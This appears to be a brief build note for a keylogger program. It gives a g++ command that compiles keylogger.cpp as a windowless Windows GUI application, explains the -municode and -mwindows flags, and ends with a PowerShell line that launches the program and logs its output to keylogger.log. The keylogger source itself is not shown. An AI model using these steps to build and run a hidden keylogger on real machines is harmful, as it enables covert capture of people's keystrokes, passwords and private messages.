g++ -o keylogger.exe ./keylogger.cpp -mwindows 

municode - enables unicode suppport for wmain() if used
mwindows - tells the compiler it's a windows gui application

Start-Process -RedirectStandardOutput ./keylogger.log ./keylogger.exe
